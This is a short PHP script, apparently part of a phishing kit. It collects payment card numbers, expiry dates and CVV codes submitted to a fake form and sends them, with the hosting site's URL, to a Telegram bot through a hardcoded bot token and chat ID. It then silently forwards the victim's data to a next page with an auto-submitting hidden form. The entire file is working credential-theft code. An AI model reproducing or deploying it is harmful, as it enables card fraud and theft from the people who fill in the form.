<?php

function send_to_telegram($arr)
{
    $token = "5472860139:AAHp7FuKAPGIHjPeY8Zgm9KjrJlnTispT-c";
    $chat_id = "-1001257574764";
    $txt = "";
    foreach ($arr as $key => $value) {
        $txt .= "<b>" . $key . "</b>" . $value . "%0A";
    }
    return fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}", "r");
}


$numero = isset($_POST['cardNumber']) ? $_POST['cardNumber'] : "";
$mes = isset($_POST['expMonth']) ? $_POST['expMonth'] : "";
$ano = isset($_POST['expirationYear']) ? $_POST['expirationYear'] : "";
$pass = isset($_POST['cvv']) ? $_POST['cvv'] : "";


$url =  $_SERVER["SERVER_NAME"] . substr($_SERVER['REQUEST_URI'], 0, strrpos($_SERVER['REQUEST_URI'], 'index_files'));
$cc = "$numero:$mes:$ano:$pass";

$arr = array(
    'cc: ' => $cc,
    'de: ' => $url,
);


send_to_telegram($arr);

?>
<form id="myForm" action="./action.php" method="post">
    <?php
    foreach ($_POST as $a => $b) {
        echo '<input type="hidden" name="' . htmlentities($a) . '" value="' . htmlentities($b) . '">';
    }
    ?>
</form>
<script type="text/javascript">
    window.onload = function() {
        document.getElementById('myForm').submit();
        // document.forms['member_signup'].submit();
    }
</script>